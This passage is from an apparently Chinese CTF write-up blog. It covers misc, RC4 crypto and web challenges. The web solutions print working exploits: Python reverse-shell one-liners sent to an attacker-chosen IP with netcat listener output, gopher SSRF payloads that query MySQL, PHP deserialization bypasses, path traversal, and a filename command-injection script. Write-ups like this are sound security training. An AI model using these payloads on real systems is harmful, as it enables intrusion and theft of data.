class="line">CAFFE_MODEL = <span class="string">'kaggle-dogs-vs-cats-solution/demo/SqeezeNet_v1.1/model.caffemodel'</span><span class="comment">#model.caffemodel</span></span><br><span class="line">MEAN_FILE = <span class="string">'kaggle-dogs-vs-cats-solution/demo/SqeezeNet_v1.1/mean.npy'</span> <span class="comment">#mean.npy</span></span><br><span class="line">MODEL_POSTFIX= CAFFE_MODEL.split(os.sep)[<span class="number">-2</span>] <span class="comment"># not safe way</span></span><br><span class="line"><span class="string">'''CAT_DATA_FOLDER= sys.argv[4]</span></span><br><span class="line"><span class="string">DOG_DATA_FOLDER= sys.argv[5]'''</span></span><br><span class="line"></span><br><span class="line">print(<span class="string">"MODEL_POSTFIX"</span>, MODEL_POSTFIX)</span><br><span class="line"></span><br><span class="line"><span class="comment">#caffe.set_mode_gpu()</span></span><br><span class="line">net = caffe.Classifier(DEPLOY_PROTOTXT, CAFFE_MODEL,</span><br><span class="line">                       mean=np.load(MEAN_FILE).mean(<span class="number">1</span>).mean(<span class="number">1</span>),</span><br><span class="line">                       channel_swap=(<span class="number">2</span>,<span class="number">1</span>,<span class="number">0</span>),</span><br><span class="line">                       raw_scale=<span class="number">255</span>,</span><br><span class="line">                       image_dims=(<span class="number">256</span>, <span class="number">256</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line">img = Image.new(<span class="string">"L"</span>, (<span class="number">87</span>, <span class="number">87</span>), <span class="number">255</span>)</span><br><span class="line">col = <span class="number">0</span></span><br><span class="line">row = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">7569</span>):</span><br><span class="line">    prediction = net.predict([caffe.io.load_image(<span class="string">'pics/'</span> + str(i) + <span class="string">'.png'</span>)])</span><br><span class="line">    print(i, prediction[<span class="number">0</span>].argmax())</span><br><span class="line">    <span class="keyword">if</span> (prediction[<span class="number">0</span>].argmax() == <span class="number">1</span>):</span><br><span class="line">        img.putpixel((col, row), <span class="number">0</span>)</span><br><span class="line">    col += <span class="number">1</span></span><br><span class="line">    <span class="keyword">if</span> col == <span class="number">87</span>:</span><br><span class="line">        img.show()</span><br><span class="line">        row += <span class="number">1</span></span><br><span class="line">        col = <span class="number">0</span></span><br><span class="line">img.save(<span class="string">'out.png'</span>)</span><br></pre></td></tr></table></figure>

<p><img src="https://i.loli.net/2019/03/08/5c826d603e3ac.png" alt=""></p>
<p>然后你就可以得到这个~</p>
<p>扫一下得到 C1CTF{Do_u_lik3_An1mals?}</p>
<h3 id="0x04-easy-crypto"><a href="#0x04-easy-crypto" class="headerlink" title="0x04 easy_crypto"></a>0x04 easy_crypto</h3><p>1 和 2 比较相似, 就一起说了, 两题都是 RC4, 因为是对称加密, 所以对于第一题 easy_crypto1 只要翻译过来就行了, 我就在网上找了个现成的</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">crypt</span><span class="params">(data, key)</span>:</span></span><br><span class="line">    <span class="string">"""RC4 algorithm"""</span></span><br><span class="line">    x = <span class="number">0</span></span><br><span class="line">    box = [i <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">256</span>)]</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">256</span>):</span><br><span class="line">        x = (x + box[i] + ord(key[i % len(key)])) % <span class="number">256</span></span><br><span class="line">        box[i], box[x] = box[x], box[i]</span><br><span class="line">    x = y = <span class="number">0</span></span><br><span class="line">    out = []</span><br><span class="line">    <span class="keyword">for</span> char <span class="keyword">in</span> data:</span><br><span class="line">        x = (x + <span class="number">1</span>) % <span class="number">256</span></span><br><span class="line">        y = (y + box[x]) % <span class="number">256</span></span><br><span class="line">        box[x], box[y] = box[y], box[x]</span><br><span class="line">        out.append(chr(char ^ box[(box[x] + box[y]%<span class="number">256</span>) % <span class="number">256</span>]))</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="string">''</span>.join(out)</span><br><span class="line"></span><br><span class="line">data = open(<span class="string">'easy_enc.txt'</span>, <span class="string">'rb'</span>).read()</span><br><span class="line">key = <span class="string">'hello world'</span></span><br><span class="line">data = data.replace(<span class="string">"\r"</span>.encode(), <span class="string">""</span>.encode())</span><br><span class="line">data = crypt(data, key)</span><br><span class="line">print(data)</span><br><span class="line"><span class="comment"># C1ctf&#123;5ca4a10ca6de1639674a822cc93c81fb&#125;</span></span><br></pre></td></tr></table></figure>

<p>注意 data.replace(“\r”.encode(), “”.encode()), 出题人用的 windows 保存的时候忘了用 wb 模式了, 所以把 CRLF 给一起保存进去了, 所以 \r 会乱码, 把 \r 替换掉就 ok</p>
<p>第二题, 出题人把 key 加密了一下, 我们取一段来看看 <code>_____*((__//__+___+______-____%____)**</code> 可以猜出来 _ 的数量对应数字, 这整个 key 其实是个表达式. 写个脚本解密一下</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line">key = <span class="string">"_____*((__//__+___+______-____%____)**((___%(___-_))+________+(___%___+_____+_______%__+______-(______//(_____%___)))))+__*(((________/__)+___%__+_______-(________//____))**(_*(_____+_____)+_______+_________%___))+________*(((_________//__+________%__)+(_______-_))**((___+_______)+_________-(______//__)))+_______*((___+_________-(______//___-_______%__%_))**(_____+_____+_____))+__*(__+_________-(___//___-_________%_____%__))**(_________-____+_______)+(___+_______)**(________%___%__+_____+______)+(_____-__)*((____//____-_____%____%_)+_________)**(_____-(_______//_______+_________%___)+______)+(_____+(_________%_______)\*__+_)\*\*_________+_______*(((_________%_______)\*__+_______-(________//________))\*\*_______)+(________/__)*(((____-_+_______)*(______+____))\*\*___)+___\*((__+_________-_)\*\*_____)+___\*(((___+_______-______/___+__-_________%_____%__)*(___-_+________/__+_________%_____))\*\*__)+(_//_)\*(((________%___%__+_____+_____)%______)+_______-_)\*\*___+_____\*((______/(_____%___))+_______)*((_________%_______)*__+_____+_)+___//___+_________+_________/___"</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">100</span>, <span class="number">0</span>, <span class="number">-1</span>):</span><br><span class="line">    key = key.replace(<span class="string">"_"</span> * i, str(i))</span><br><span class="line">print(key)</span><br><span class="line">key = int(eval(key))</span><br><span class="line">print(key)</span><br><span class="line">key = hex(key)</span><br><span class="line">print(base64.b16decode(key[<span class="number">2</span>:].upper()))</span><br><span class="line"></span><br><span class="line">$ python2 crypto1/rep.py <span class="comment"># 注意这里得用 python2, 3的话会自动转浮点, 精度会丢失</span></span><br><span class="line"><span class="number">5</span>((<span class="number">2</span>//<span class="number">2</span>+<span class="number">3</span>+<span class="number">6</span><span class="number">-4</span>%<span class="number">4</span>)((<span class="number">3</span>%(<span class="number">3</span><span class="number">-1</span>))+<span class="number">8</span>+(<span class="number">3</span>%<span class="number">3</span>+<span class="number">5</span>+<span class="number">7</span>%<span class="number">2</span>+<span class="number">6</span>-(<span class="number">6</span>//(<span class="number">5</span>%<span class="number">3</span>)))))+<span class="number">2</span>(((<span class="number">8</span>/<span class="number">2</span>)+<span class="number">3</span>%<span class="number">2</span>+<span class="number">7</span>-(<span class="number">8</span>//<span class="number">4</span>))(<span class="number">1</span>(<span class="number">5</span>+<span class="number">5</span>)+<span class="number">7</span>+<span class="number">9</span>%<span class="number">3</span>))+<span class="number">8</span>(((<span class="number">9</span>//<span class="number">2</span>+<span class="number">8</span>%<span class="number">2</span>)+(<span class="number">7</span><span class="number">-1</span>))((<span class="number">3</span>+<span class="number">7</span>)+<span class="number">9</span>-(<span class="number">6</span>//<span class="number">2</span>)))+<span class="number">7</span>((<span class="number">3</span>+<span class="number">9</span>-(<span class="number">6</span>//<span class="number">3</span><span class="number">-7</span>%<span class="number">2</span>%<span class="number">1</span>))(<span class="number">5</span>+<span class="number">5</span>+<span class="number">5</span>))+<span class="number">2</span>(<span class="number">2</span>+<span class="number">9</span>-(<span class="number">3</span>//<span class="number">3</span><span class="number">-9</span>%<span class="number">5</span>%<span class="number">2</span>))(<span class="number">9</span><span class="number">-4</span>+<span class="number">7</span>)+(<span class="number">3</span>+<span class="number">7</span>)(<span class="number">8</span>%<span class="number">3</span>%<span class="number">2</span>+<span class="number">5</span>+<span class="number">6</span>)+(<span class="number">5</span><span class="number">-2</span>)((<span class="number">4</span>//<span class="number">4</span><span class="number">-5</span>%<span class="number">4</span>%<span class="number">1</span>)+<span class="number">9</span>)(<span class="number">5</span>-(<span class="number">7</span>//<span class="number">7</span>+<span class="number">9</span>%<span class="number">3</span>)+<span class="number">6</span>)+(<span class="number">5</span>+(<span class="number">9</span>%<span class="number">7</span>)<span class="number">2</span>+<span class="number">1</span>)<span class="number">9</span>+<span class="number">7</span>(((<span class="number">9</span>%<span class="number">7</span>)<span class="number">2</span>+<span class="number">7</span>-(<span class="number">8</span>//<span class="number">8</span>))<span class="number">7</span>)+(<span class="number">8</span>/<span class="number">2</span>)(((<span class="number">4</span><span class="number">-1</span>+<span class="number">7</span>)(<span class="number">6</span>+<span class="number">4</span>))<span class="number">3</span>)+<span class="number">3</span>((<span class="number">2</span>+<span class="number">9</span><span class="number">-1</span>)<span class="number">5</span>)+<span class="number">3</span>(((<span class="number">3</span>+<span class="number">7</span><span class="number">-6</span>/<span class="number">3</span>+<span class="number">2</span><span class="number">-9</span>%<span class="number">5</span>%<span class="number">2</span>)(<span class="number">3</span><span class="number">-1</span>+<span class="number">8</span>/<span class="number">2</span>+<span class="number">9</span>%<span class="number">5</span>))<span class="number">2</span>)+(<span class="number">1</span>//<span class="number">1</span>)(((<span class="number">8</span>%<span class="number">3</span>%<span class="number">2</span>+<span class="number">5</span>+<span class="number">5</span>)%<span class="number">6</span>)+<span class="number">7</span><span class="number">-1</span>)*<span class="number">3</span>+<span class="number">5</span>((<span class="number">6</span>/(<span class="number">5</span>%<span class="number">3</span>))+<span class="number">7</span>)((<span class="number">9</span>%<span class="number">7</span>)<span class="number">2</span>+<span class="number">5</span>+<span class="number">1</span>)+<span class="number">3</span>//<span class="number">3</span>+<span class="number">9</span>+<span class="number">9</span>/<span class="number">3</span></span><br><span class="line"><span class="number">5287002131074331513</span></span><br><span class="line">I_4m-k3y</span><br></pre></td></tr></table></figure>

<p>I_4m-k3y 就是 key 了, 然后又找到一个现成的脚本, 解密一下</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">crypt</span><span class="params">(data, key)</span>:</span></span><br><span class="line">    <span class="string">"""RC4 algorithm"""</span></span><br><span class="line">    x = <span class="number">0</span></span><br><span class="line">    box = range(<span class="number">256</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">256</span>):</span><br><span class="line">        x = (x + box[i] + ord(key[i % len(key)])) % <span class="number">256</span></span><br><span class="line">        box[i], box[x] = box[x], box[i]</span><br><span class="line">    x = y = <span class="number">0</span></span><br><span class="line">    out = []</span><br><span class="line">    <span class="keyword">for</span> char <span class="keyword">in</span> data:</span><br><span class="line">        x = (x + <span class="number">1</span>) % <span class="number">256</span></span><br><span class="line">        y = (y + box[x]) % <span class="number">256</span></span><br><span class="line">        box[x], box[y] = box[y], box[x]</span><br><span class="line">        out.append(chr(ord(char) ^ box[(box[x] + box[y]) % <span class="number">256</span>]))</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="string">''</span>.join(out)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">tencode</span><span class="params">(data, key, encode=base64.b64encode, salt_length=<span class="number">16</span>)</span>:</span></span><br><span class="line">    <span class="string">"""RC4 encryption with random salt and final encoding"""</span></span><br><span class="line">    salt = <span class="string">''</span></span><br><span class="line">    <span class="keyword">for</span> n <span class="keyword">in</span> range(salt_length):</span><br><span class="line">        salt += chr(random.randrange(<span class="number">256</span>))</span><br><span class="line">    data = salt + crypt(data, sha1(key + salt).digest())</span><br><span class="line">    <span class="keyword">if</span> encode:</span><br><span class="line">        data = encode(data)</span><br><span class="line">    <span class="keyword">return</span> data</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">tdecode</span><span class="params">(data, key, decode=base64.b64decode, salt_length=<span class="number">16</span>)</span>:</span></span><br><span class="line">    <span class="string">"""RC4 decryption of encoded data"""</span></span><br><span class="line">    <span class="keyword">if</span> decode:</span><br><span class="line">        data = decode(data)</span><br><span class="line">    salt = data[:salt_length]</span><br><span class="line">    <span class="keyword">return</span> crypt(data[salt_length:], sha1(key + salt).digest())</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> tdecode(strCipher, key)</span><br><span class="line"><span class="comment"># C1ctf&#123;5f601e8cc1bde1f1a54e336158ba766d&#125;</span></span><br></pre></td></tr></table></figure>

<h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h2><h3 id="0x01-resize-your-image"><a href="#0x01-resize-your-image" class="headerlink" title="0x01 resize your image"></a>0x01 resize your image</h3><p>vulhub <a href="https://github.com/vulhub/vulhub/tree/master/python/PIL-CVE-2018-16509" target="_blank" rel="noopener">原题</a>, payload 改一下  </p>
<p><code>python -c &quot;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&#39;Your IP&#39;,Your Port));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([&#39;/bin/sh&#39;,&#39;-i&#39;]);&quot;</code></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">$ nc -lvvp <span class="number">19132</span></span><br><span class="line">Listening on [<span class="number">0.0</span><span class="number">.0</span><span class="number">.0</span>] (family <span class="number">0</span>, port <span class="number">19132</span>)</span><br><span class="line">Connection <span class="keyword">from</span> <span class="number">212.64</span><span class="number">.85</span><span class="number">.131</span> <span class="number">40172</span> received!</span><br><span class="line">/bin/sh: <span class="number">0</span>: can<span class="string">'t access tty; job control turned off</span></span><br><span class="line"><span class="string"># ls</span></span><br><span class="line"><span class="string">app.py</span></span><br><span class="line"><span class="string">flag</span></span><br><span class="line"><span class="string"># cat flag</span></span><br><span class="line"><span class="string">C1CTF&#123;hello_world&#125;</span></span><br></pre></td></tr></table></figure>

<h3 id="0x02-web签到"><a href="#0x02-web签到" class="headerlink" title="0x02 web签到"></a>0x02 web签到</h3><p>改一下 cookie 就行, 我用的是 <a href="https://chrome.google.com/webstore/detail/edit-this-cookie/fngmhnnpilhplaeedifhccceomclgfbg" target="_blank" rel="noopener">EditThisCookie</a></p>
<p><img src="https://i.loli.net/2019/03/08/5c826dfb50be6.png" alt="">  </p>
<p><img src="https://i.loli.net/2019/03/08/5c826e11a3277.png" alt="">  </p>
<h3 id="0x03-php是世界上最好的语言"><a href="#0x03-php是世界上最好的语言" class="headerlink" title="0x03 php是世界上最好的语言"></a>0x03 php是世界上最好的语言</h3><p>在 <a href="http://212.64.85.131/robots.txt" target="_blank" rel="noopener">http://212.64.85.131/robots.txt</a> 可以找到提示, <code>Disallow: /flag.zip</code>, 下下来就可以得到源码, 接下来就是源码审计</p>
<ol>
<li><code>($a == $b) + (md5($a) != sha1($b))</code> 这个很好绕, 传两个值不一样的数组就可以绕过, 比如 <code>a[1]=1&amp;b[1]=2</code>. 原理是 md5 和 sha1 对 数组会返回 NULL</li>
</ol>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">php &gt; var_dump(md5(<span class="keyword">array</span>()));</span><br><span class="line">PHP Warning:  md5() expects parameter <span class="number">1</span> to be string, <span class="keyword">array</span> given in php shell code on line <span class="number">1</span></span><br><span class="line"></span><br><span class="line">Warning: md5() expects parameter <span class="number">1</span> to be string, <span class="keyword">array</span> given in php shell code on line <span class="number">1</span></span><br><span class="line"><span class="keyword">NULL</span></span><br></pre></td></tr></table></figure>

<p>2.<code>$token[&#39;user&#39;] == &quot;????????&quot; &amp;&amp; $token[&#39;pass&#39;] == &quot;????????&quot;</code> 我竟然以为真的要想办法绕过… 后来试了下居然真的只要让 <code>user=????????</code> 就行了233</p>
<p>3.<code>$flag-&gt;middle === $flag-&gt;left &amp;&amp; $flag-&gt;middle === $flag-&gt;right</code> 这个绕过第一感觉是不可能, 除非能有像 C++ 那样的引用, 然后百度了一下… 居然真的有这种骚东西 还真的可以序列化 233</p>
<p>如果反序列化这方面有问题的话可以百度一下对应的教程</p>
<p>整合一下得到 payload <code>curl &quot;http://212.64.85.131/?mode=begin&amp;a[1]=1&amp;b[1]=2&quot; -d &#39;token=a:2:{s:4:&quot;user&quot;;s:8:&quot;????????&quot;;s:4:&quot;pass&quot;;s:8:&quot;????????&quot;;}&amp;flag=O:9:&quot;last_task&quot;:3:{s:4:&quot;left&quot;;N;s:6:&quot;middle&quot;;R:2;s:5:&quot;right&quot;;R:2;}&#39;</code></p>
<p>得到 this is your flag C1ctf{Php_1s_best_language_in_the_world}  </p>
<h3 id="0x04-今年还有小姐姐"><a href="#0x04-今年还有小姐姐" class="headerlink" title="0x04 今年还有小姐姐"></a>0x04 今年还有小姐姐</h3><p>fuzz 一下 file:// 被过滤了, 然后看了下 HINT. 发现在 info.php 左下角非常猥琐的藏着 sql 语句…</p>
<p><img src="https://i.loli.net/2019/03/08/5c826e702af72.png" alt=""></p>
<p>基本上可以确定是 gopher + ssrf 了</p>
<p>让他访问 <a href="http://127.0.0.1:3306" target="_blank" rel="noopener">http://127.0.0.1:3306</a> 也确实可以得到 mysql 的 banner</p>
<p><img src="https://i.loli.net/2019/03/08/5c826e89d5c9b.png" alt=""></p>
<p>具体原理可以看<a href="https://www.freebuf.com/articles/web/159342.html" target="_blank" rel="noopener">这里</a>, 简单来说 gopher 协议可以将任意内容通过 tcp 发送, 而 mysql 在空密码时握手包的内容是固定的, 我们就可以通过 gopher 来读取数据库中的内容</p>
<p>这里可以通过在本地搭一个空密码的 root 账号的 mysql 加上 wireshark 来重放一遍客户端发送的数据, 得到服务器上数据库的应答</p>
<p>这里可以用 -e 选项来直接执行命令. 通过提示里的表结构可以构造如下语句</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">mysql -u root -e <span class="string">"SELECT path FROM ctf.flag"</span> -h127.0.0.1</span><br></pre></td></tr></table></figure>

<p>然后在 wireshark 里面导出以后用 urlencode 一下加在 gopher://127.0.0.1:3306/A 后面(注意A留着, 不能删), 这里我的 payload 是 </p>
<p><code>gopher://127.0.0.1:3306/A%A4%00%00%01%85%A2%3F%00%00%00%00%01%21%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00root%00%00mysql_native_password%00g%03_os%05Linux%0C_client_name%08libmysql%04_pid%0520083%0F_client_version%0710.1.37%09_platform%06x86_64%0Cprogram_name%05mysql%1A%00%00%00%03SELECT%20path%20FROM%20ctf.flag%01%00%00%00%01</code></p>
<p><img src="https://i.loli.net/2019/03/08/5c826ec9b4061.png" alt=""></p>
<p><code>/var/lib/mysql-files/flag.txt</code> 即是路径, 再通过 load_file 来读取它</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">mysql -u root -e <span class="string">"SELECT load_file('/var/lib/mysql-files/flag.txt')"</span> -h127.0.0.1</span><br></pre></td></tr></table></figure>

<p>得到 payload </p>
<p><code>gopher://127.0.0.1:3306/A%A4%00%00%01%85%A2%3F%00%00%00%00%01%21%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00root%00%00mysql_native_password%00g%03_os%05Linux%0C_client_name%08libmysql%04_pid%0520924%0F_client_version%0710.1.37%09_platform%06x86_64%0Cprogram_name%05mysql2%00%00%00%03SELECT%20load_file%28%27/var/lib/mysql-files/flag.txt%27%29%01%00%00%00%01</code></p>
<p>然后你会得到… </p>
<p><img src="https://i.loli.net/2019/03/08/5c826ef30a8bd.png" alt=""></p>
<p>太真实了, 再 fuzz 一下, 发现过滤了 file 和 - 字符, 直接 urlencode 一下就可以 bypass, 得到新的 payload </p>
<p><code>gopher://127.0.0.1:3306/A%A4%00%00%01%85%A2%3F%00%00%00%00%01%21%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00root%00%00mysql_native_password%00g%03_os%05Linux%0C_client_name%08libmysql%04_pid%0520924%0F_client_version%0710.1.37%09_platform%06x86_64%0Cprogram_name%05mysql2%00%00%00%03SELECT%20load_%66ile%28%27/var/lib/mysql%2dfiles/flag.txt%27%29%01%00%00%00%01</code></p>
<p><img src="https://i.loli.net/2019/03/08/5c826f0a88582.png" alt=""></p>
<p>得到 flag{gopher_make_mysql_happy}</p>
<h3 id="0x05-eeeee"><a href="#0x05-eeeee" class="headerlink" title="0x05 eeeee"></a>0x05 eeeee</h3><p>考察点: Django目录穿越,命令执行bypass</p>
<p>入口点: <a href="http://212.64.89.186/booksystem/static/" target="_blank" rel="noopener">http://212.64.89.186/booksystem/static/</a><br>访问之后是500,在后面输入内容显示文件不存在, 所以这里可以判断出是存在文件读取的：<br><a href="http://212.64.89.186/booksystem/static/..%2f..%2fpass.txt" target="_blank" rel="noopener">http://212.64.89.186/booksystem/static/..%2f..%2fpass.txt</a><br>后台逻辑为:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">do_GET</span><span class="params">(request,filename)</span>:</span></span><br><span class="line">    full_path = os.path.join(<span class="string">'static'</span>, filename)</span><br><span class="line">    <span class="comment">#print(full_path)</span></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> os.path.exists(full_path):</span><br><span class="line">        <span class="keyword">return</span> HttpResponseNotFound(<span class="string">'&lt;h1&gt;file not found&lt;h1&gt;'</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">if</span>(filename[<span class="number">-3</span>:]==<span class="string">"css"</span>):</span><br><span class="line">            response = HttpResponse(read_file(full_path))</span><br><span class="line">            response[<span class="string">'Content-Type'</span>] = <span class="string">'text/css'</span></span><br><span class="line">            response[<span class="string">'Content-Length'</span>] = os.path.getsize(full_path)</span><br><span class="line">            <span class="comment">#response['Content-Disposition'] = 'attachment; filename=%s' % filename</span></span><br><span class="line">            response[<span class="string">'Accept-Ranges'</span>] = <span class="string">'bytes'</span></span><br><span class="line">            <span class="keyword">return</span> response</span><br><span class="line">        <span class="keyword">elif</span>(filename[<span class="number">-3</span>:]==<span class="string">"svg"</span>):</span><br><span class="line">            response = HttpResponse(read_file(full_path))</span><br><span class="line">            response[<span class="string">'Content-Type'</span>] = <span class="string">'image/svg+xml'</span></span><br><span class="line">            response[<span class="string">'Content-Length'</span>] = os.path.getsize(full_path)</span><br><span class="line">            <span class="comment">#response['Content-Disposition'] = 'attachment; filename=%s' % filename</span></span><br><span class="line">            response[<span class="string">'Accept-Ranges'</span>] = <span class="string">'bytes'</span></span><br><span class="line">            <span class="keyword">return</span> response</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            response = HttpResponse(read_file(full_path))</span><br><span class="line">            response[<span class="string">'Content-Type'</span>] = <span class="string">'text/html'</span></span><br><span class="line">            response[<span class="string">'Content-Length'</span>] = os.path.getsize(full_path)</span><br><span class="line">            <span class="comment">#response['Content-Disposition'] = 'attachment; filename=%s' % filename</span></span><br><span class="line">            response[<span class="string">'Accept-Ranges'</span>] = <span class="string">'bytes'</span></span><br><span class="line">            <span class="keyword">return</span> response   </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">read_file</span><span class="params">(filename)</span>:</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">with</span> open(filename, <span class="string">'rb'</span>) <span class="keyword">as</span> f:</span><br><span class="line">            content = f.read()</span><br><span class="line">            <span class="keyword">yield</span> content</span><br><span class="line">        f.close()</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        print(e.message)</span><br><span class="line">        print(<span class="string">'read error'</span>)</span><br></pre></td></tr></table></figure>

<p>可以读取到admin的用户名和密码,然后进行登录: admin:this_is_admin_password</p>
<p>使用admin登录之后可以看到上传文件的地方,因为是python写的, 所以不太确定能不能上传webshell, 然后使用之前的任意文件读取读源码, 看实现逻辑:<br><a href="http://212.64.89.186/booksystem/static/..%2fbooksystem/views.py" target="_blank" rel="noopener">http://212.64.89.186/booksystem/static/..%2fbooksystem/views.py</a><br>实现逻辑:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Do_upload</span><span class="params">(request)</span>:</span> <span class="comment">#文件上传, 格式转换</span></span><br><span class="line">    black_list = [<span class="string">'`'</span>,<span class="string">';'</span>,<span class="string">'&amp;'</span>,<span class="string">'|'</span>,<span class="string">"PS"</span>,<span class="string">'&gt;'</span>,<span class="string">"&lt;"</span>]</span><br><span class="line">    <span class="comment">#return HttpResponse(os.path)</span></span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">'POST'</span>:</span><br><span class="line">        ret = &#123;<span class="string">'status'</span>: <span class="literal">False</span>, <span class="string">'data'</span>: <span class="literal">None</span>, <span class="string">'error'</span>: <span class="literal">None</span>&#125;</span><br><span class="line">        user = request.POST.get(<span class="string">'user'</span>)</span><br><span class="line">        img = request.FILES.get(<span class="string">'img'</span>)</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> black_list:</span><br><span class="line">            <span class="keyword">if</span> i <span class="keyword">in</span> img.name:</span><br><span class="line">                <span class="keyword">return</span> HttpResponse(<span class="string">"你是魔鬼吗？"</span>)</span><br><span class="line">        f = open(os.path.join(<span class="string">'upfile'</span>, img.name), <span class="string">'wb'</span>)</span><br><span class="line">        <span class="comment">#return HttpResponse(os.path)</span></span><br><span class="line">        <span class="keyword">for</span> chunk <span class="keyword">in</span> img.chunks(chunk_size=<span class="number">1024</span>):</span><br><span class="line">            <span class="keyword">if</span> <span class="string">b"%!PS"</span> <span class="keyword">in</span> chunk:</span><br><span class="line">                 <span class="keyword">return</span> HttpResponse(<span class="string">"你是个大魔鬼！"</span>)</span><br><span class="line">            f.write(chunk)</span><br><span class="line">        f.close()</span><br><span class="line">        ret[<span class="string">'status'</span>] = <span class="literal">True</span></span><br><span class="line">        ret[<span class="string">'data'</span>] = os.path.join(<span class="string">'upfile'</span>, <span class="string">'smaller_'</span>+img.name)</span><br><span class="line">        command = <span class="string">"convert -resize 200x100 \`pwd\`/upfile/"</span>+img.name+<span class="string">"  \`pwd\`/upfile/smaller_"</span>+img.name+<span class="string">";rm \`pwd\`/upfile/"</span>+img.name</span><br><span class="line">        <span class="comment">#os.system("echo "+command+"&gt; /tmp/123")</span></span><br><span class="line">        os.system(command)</span><br><span class="line">        <span class="keyword">return</span> HttpResponse(json.dumps(ret))</span><br><span class="line">        <span class="comment"># except Exception as e:</span></span><br><span class="line">        <span class="comment">#     ret['error'] = e</span></span><br><span class="line">        <span class="comment"># finally:</span></span><br><span class="line">        <span class="comment">#     f.close()</span></span><br><span class="line">        <span class="comment">#     return HttpResponse(json.dumps(ret))</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> HttpResponse(<span class="string">''</span>)</span><br></pre></td></tr></table></figure>

<p>本意是利用imagemagic的洞getshell的, 但是我太懒了, 没有换服务器里面的版本, 所以就只能用文件名导致的命令注入了, 这里有个坑, nginx会把 “/“ 后面的作为文件名解析, 所以需要绕过 “/“, exp:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">files = &#123;</span><br><span class="line">    <span class="string">"img"</span>: (<span class="string">"asd\npython -c \"import socket,subprocess,os\ns=socket.socket(socket.AF_INET,socket.SOCK_STREAM)\ns.connect(('Your_ip',19132))\nos.dup2(s.fileno(),0)\nos.dup2(s.fileno(),1)\nos.dup2(s.fileno(),2)\np=subprocess.call([chr(47)+'bin'+chr(47)+'sh','-i'])\""</span>, <span class="string">"asd"</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">res = requests.post(<span class="string">"http://212.64.89.186/upload/"</span>, files=files)</span><br><span class="line">print(res.text)</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ nc -lvvp 19132</span><br><span class="line">Listening on [0.0.0.0] (family 0, port 19132)</span><br><span class="line">Connection from 212.64.89.186 38538 received!</span><br><span class="line">&#x2F;bin&#x2F;sh: 0: can&#39;t access tty; job control turned off</span><br><span class="line">$ ls</span><br><span class="line">FlightTicket</span><br><span class="line">a.txt</span><br><span class="line">aaab.txt</span><br><span class="line">article.db</span><br><span class="line">booksystem</span><br><span class="line">flightdb.sqlite3</span><br><span class="line">index.html</span><br><span class="line">index.html.1</span><br><span class="line">index.html.2</span><br><span class="line">manage.py</span><br><span class="line">nohup.out</span><br><span class="line">pass.txt</span><br><span class="line">requirements.txt</span><br><span class="line">static</span><br><span class="line">templates</span><br><span class="line">testdb.py</span><br><span class="line">upfile</span><br><span class="line">$ cat ~&#x2F;Flaaa44444AAAAAAGGGGGG</span><br><span class="line">flag&#123;Django_is_Very_Interesting&#125;</span><br></pre></td></tr></table></figure>

<h3 id="0x06-baby-exec"><a href="#0x06-baby-exec" class="headerlink" title="0x06 baby exec"></a>0x06 baby exec</h3><p>代码如下:</p>
